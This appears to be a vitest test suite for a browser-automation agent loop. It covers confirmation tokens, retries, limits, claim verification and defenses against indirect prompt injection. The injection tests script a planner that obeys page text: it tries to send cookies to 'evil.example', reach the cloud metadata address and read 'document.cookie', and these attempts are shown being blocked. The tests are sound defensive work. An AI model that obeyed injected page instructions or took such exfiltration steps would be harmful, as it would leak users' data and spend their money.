import { describe, expect, it } from "vitest";
import type { ActionPlanner, LoopContext, PlannerDecision } from "../../src/browser/loop";
import { HOME, makeStack, openHome, ownerA, ownerB } from "./harness";

/** A planner that follows a fixed script. It stands in for a model: the loop and tool layer must be safe whatever it says. */
const scripted = (fn: (ctx: LoopContext, i: number) => PlannerDecision): ActionPlanner => {
  let i = 0;
  return { next: async (ctx) => fn(ctx, i++) };
};
const step = (tool: string, args: Record<string, unknown> = {}, extra: Partial<Extract<PlannerDecision, { kind: "step" }>["step"]> = {}): PlannerDecision => ({ kind: "step", step: { tool, args, ...extra } });
const finish = (...claims: { urlPathIncludes?: string; textIncludes?: string; cartCount?: number }[]): PlannerDecision => ({ kind: "finish", claims });

describe("action loop: plan, validate, execute, verify, decide", () => {
  it("completes a multi-step task and accepts the finish only after re-verifying its claims, then destroys the session", async () => {
    const s = makeStack();
    const planner = scripted((_c, i) => [step("browser.search", { query: "smartphone", maxPriceLkr: 100_000 }, { expect: { urlPathIncludes: "max=100000" } }), step("browser.find_elements", { nameContains: "Orbit" }), finish({ textIncludes: "Orbit Pro" }, { urlPathIncludes: "/products" })][i]!);
    const out = await s.runner().run(ownerA, "phone under 100000", planner);
    expect(out.status).toBe("completed");
    expect(out.claimsVerified).toBe(true);
    expect(out.history.map((h) => h.tool)).toEqual(["browser.search", "browser.find_elements"]);
    expect(out.history[0]).toMatchObject({ ok: true, verified: true, expectationMet: true });
    expect(s.sessions.activeCount).toBe(0);
    expect(s.driver.closedSessions).toHaveLength(1);
  });

  it("never accepts a claim the page does not back up (no 'added to cart' without a cart)", async () => {
    const s = makeStack();
    const planner = scripted((_c, i) => [step("browser.open_page", { target: "/products/nova-x1" }), finish({ cartCount: 1 })][i]!);
    const out = await s.runner().run(ownerA, "add the phone to my cart", planner);
    expect(out.status).toBe("failed");
    expect(out.reason).toBe("claim_not_verified");
    expect(out.claimsVerified).toBe(false);
    expect(s.sessions.activeCount).toBe(0);
  });

  it("a finish with no verifiable claim is refused", async () => {
    const s = makeStack();
    const out = await s.runner().run(ownerA, "x", scripted((_c, i) => [step("browser.open_page", { target: HOME }), finish()][i]!));
    expect(out).toMatchObject({ status: "failed", reason: "no_verifiable_claim" });
  });

  it("an add-to-cart pauses for the shopper, resumes only with a token for that exact action, and then the cart is verified", async () => {
    const s = makeStack();
    const planner = scripted((c, i) => {
      if (i === 0) return step("browser.open_page", { target: "/products/nova-x1" });
      if (i === 1) return step("browser.find_elements", { nameContains: "Add to cart" });
      if (i === 2) return step("browser.click", { ref: c.elements![0]!.ref }, { expect: { cartCount: 1 } });
      return finish({ cartCount: 1, textIncludes: "Nova X1" });
    });
    const paused = await s.runner().run(ownerA, "add this phone to my cart", planner);
    expect(paused.status).toBe("needs_confirmation");
    expect(paused.paused?.proposal.actionClass).toBe("reversible");
    expect(s.driver.clicks).toHaveLength(0); // nothing happened yet
    expect(s.sessions.activeCount).toBe(1); // kept open, waiting for the shopper (idle timeout still applies)

    const token = s.confirmations.issue(paused.paused!.sessionId, paused.paused!.proposal.actionHash);
    const done = await s.runner().resume(ownerA, paused.paused!, token, planner);
    expect(done.status).toBe("completed");
    expect(s.driver.clicks).toHaveLength(1);
    expect(done.history.find((h) => h.tool === "browser.click")).toMatchObject({ ok: true, verified: true, expectationMet: true });
    expect(s.sessions.activeCount).toBe(0);
  });

  it("resuming with a wrong token changes nothing", async () => {
    const s = makeStack();
    const planner = scripted((c, i) => [step("browser.open_page", { target: "/products/nova-x1" }), step("browser.find_elements", { nameContains: "Add to cart" }), step("browser.click", { ref: c.elements?.[0]?.ref ?? "e1" }), finish({ cartCount: 1 })][i] ?? finish({ cartCount: 1 }));
    const paused = await s.runner().run(ownerA, "add", planner);
    const wrong = s.confirmations.issue(paused.paused!.sessionId, "0".repeat(64));
    const out = await s.runner({ maxPolicyBlocks: 1 }).resume(ownerA, paused.paused!, wrong, planner);
    expect(out.status).toBe("blocked");
    expect(out.reason).toBe("confirmation_invalid");
    expect(s.driver.clicks).toHaveLength(0);
  });

  it("the planner cannot choose the session: a foreign session id is replaced by the task's own", async () => {
    const s = makeStack();
    const foreign = await openHome(s, ownerB);
    const planner = scripted((_c, i) => [step("browser.open_page", { target: HOME }), step("browser.get_page_state", { sessionId: foreign }), finish({ urlPathIncludes: "/" })][i]!);
    const out = await s.runner().run(ownerA, "x", planner);
    expect(out.status).toBe("completed");
    expect(s.sessions.has(foreign)).toBe(true); // B's session was never touched or closed
    expect(s.driver.contexts.get(foreign)?.closed).toBe(false);
  });

  it("refuses tools that do not exist, and stops", async () => {
    const s = makeStack();
    const out = await s.runner().run(ownerA, "x", scripted((_c, i) => [step("browser.open_page", { target: HOME }), step("browser.evaluate", { code: "document.cookie" })][i]!));
    expect(out).toMatchObject({ status: "failed", reason: "unknown_tool" });
    expect(s.sessions.activeCount).toBe(0);
  });
});

describe("failure handling: retry only when safe, never repeat what changes things, never claim without checking", () => {
  it("retries a read-only step once after re-inspecting the page", async () => {
    const s = makeStack();
    s.driver.failNextGotos = 1;
    const out = await s.runner().run(ownerA, "x", scripted((_c, i) => [step("browser.open_page", { target: HOME }), finish({ urlPathIncludes: "/" })][i]!));
    expect(out.status).toBe("completed");
    expect(out.history[0]).toMatchObject({ tool: "browser.open_page", ok: true });
  });

  it("does not retry a second time when the failure persists", async () => {
    const s = makeStack();
    s.driver.failNextGotos = 5;
    const out = await s.runner().run(ownerA, "x", scripted((c, i) => (i === 0 ? step("browser.open_page", { target: HOME }) : finish({ urlPathIncludes: "/" }))));
    expect(out.status).toBe("failed");
    expect(s.driver.failNextGotos).toBe(3); // exactly two attempts were made
  });

  it("a step that changes something is never run twice with the same target, even when the planner insists", async () => {
    const s = makeStack();
    const planner = scripted((c, i) => {
      if (i === 0) return step("browser.open_page", { target: HOME });
      if (i === 1) return step("browser.find_elements", { nameContains: "Search" });
      return step("browser.type_text", { ref: c.elements?.[0]?.ref ?? "e1", text: "orbit" });
    });
    const out = await s.runner().run(ownerA, "x", planner);
    // the first type_text ran; the repeats were refused, and after two refusals the task stops
    expect(out.status).toBe("failed");
    expect(out.reason).toBe("repeated_non_idempotent");
    expect(out.history.filter((h) => h.tool === "browser.type_text" && h.ok)).toHaveLength(1);
    expect(out.history.filter((h) => h.reason === "duplicate_non_idempotent").length).toBe(2);
  });

  it("tells the planner when an expectation was not met instead of treating the step as success", async () => {
    const s = makeStack();
    let seen: LoopContext["note"];
    const planner = scripted((c, i) => {
      if (i === 0) return step("browser.open_page", { target: "/warranty-policy" }, { expect: { textIncludes: "lifetime warranty" } });
      seen = c.note;
      return finish({ textIncludes: "lifetime warranty" });
    });
    const out = await s.runner().run(ownerA, "x", planner);
    expect(seen).toBe("expectation_not_met");
    expect(out.history[0]).toMatchObject({ ok: true, expectationMet: false });
    expect(out.status).toBe("failed");
  });

  it("stops at the step budget, at the deadline and on cancellation, and always cleans up", async () => {
    const s = makeStack();
    const endless = scripted((_c, i) => (i === 0 ? step("browser.open_page", { target: HOME }) : step("browser.scroll", { direction: "down" })));
    const a = await s.runner().run(ownerA, "x", endless);
    expect(a.status).toBe("step_limit");
    expect(a.stepsUsed).toBeLessThanOrEqual(20);
    expect(s.sessions.activeCount).toBe(0);

    const s2 = makeStack();
    const slow = scripted((_c, i) => {
      s2.clock.t += 50_000;
      return i === 0 ? step("browser.open_page", { target: HOME }) : step("browser.get_page_state");
    });
    const b = await s2.runner({ deadlineMs: 120_000 }).run(ownerA, "x", slow);
    expect(b.status).toBe("timeout");
    expect(s2.sessions.activeCount).toBe(0);

    const s3 = makeStack();
    const ctl = new AbortController();
    const c = await s3.runner().run(ownerA, "x", scripted((_c, i) => { if (i === 1) ctl.abort(); return i === 0 ? step("browser.open_page", { target: HOME }) : step("browser.get_page_state"); }), ctl.signal);
    expect(c.status).toBe("cancelled");
    expect(s3.sessions.activeCount).toBe(0);
  });

  it("limits cannot be raised by configuration beyond the contract", () => {
    const s = makeStack();
    const r = s.runner({ maxSteps: 1000, deadlineMs: 10 ** 9 }) as unknown as { maxSteps: number; deadlineMs: number };
    expect(r.maxSteps).toBe(20);
    expect(r.deadlineMs).toBe(120_000);
  });
});

describe("indirect prompt injection and unauthorised requests", () => {
  it("a planner that OBEYS instructions found on a page still cannot leave the site, spend money or reveal anything", async () => {
    const s = makeStack();
    // This planner is deliberately gullible: it does whatever the page text says.
    const gullible = scripted((c, i) => {
      if (i === 0) return step("browser.open_page", { target: "/products/evil-listing" });
      if (c.page?.text.includes("open https://evil.example") && i === 1) return step("browser.open_page", { target: "https://evil.example/steal?data=cookies" });
      if (i === 2) return step("browser.open_page", { target: "https://169.254.169.254/latest/meta-data/" });
      return step("browser.find_elements", { nameContains: "Pay now" });
    });
    const out = await s.runner().run(ownerA, "show me this listing", gullible);
    expect(out.status).toBe("blocked");
    expect(s.driver.network.every((n) => n.allowed)).toBe(true); // not one request left the allowlist
    expect(s.driver.clicks).toHaveLength(0);
    expect(s.sessions.activeCount).toBe(0);
    expect(out.finalPage?.injectionSuspected).toBe(true);
  });

  it("clicking 'Pay now' on a hostile page is refused even when the planner picks the ref itself", async () => {
    const s = makeStack();
    const planner = scripted((c, i) => {
      if (i === 0) return step("browser.open_page", { target: "/products/evil-listing" });
      if (i === 1) return step("browser.find_elements", { nameContains: "Pay" });
      return step("browser.click", { ref: c.elements![0]!.ref });
    });
    const out = await s.runner({ maxPolicyBlocks: 1 }).run(ownerA, "x", planner);
    expect(out).toMatchObject({ status: "blocked", reason: "refused_financial" });
    expect(s.driver.clicks).toHaveLength(0);
  });

  it("repeated policy violations end the task instead of being probed with variations", async () => {
    const s = makeStack();
    const attempts = ["https://evil.example/", "https://www.google.com/", "http://valta.hexalyte.com/", "https://127.0.0.1/"];
    let n = 0;
    const out = await s.runner().run(ownerA, "x", scripted(() => step("browser.open_page", { target: attempts[n++ % attempts.length]! })));
    expect(out.status).toBe("blocked");
    expect(n).toBeLessThanOrEqual(3);
    expect(s.driver.network).toHaveLength(0);
  });

  it("a hostile redirect during a task destroys the session and the task reports a block, never a success", async () => {
    const s = makeStack({ enforceAllowlist: false });
    const out = await s.runner({ maxPolicyBlocks: 1 }).run(ownerA, "x", scripted((_c, i) => (i === 0 ? step("browser.open_page", { target: "/go/external" }) : finish({ urlPathIncludes: "/" }))));
    expect(out.status).toBe("blocked");
    expect(out.reason).toBe("blocked_redirect");
    expect(s.sessions.activeCount).toBe(0);
  });
});
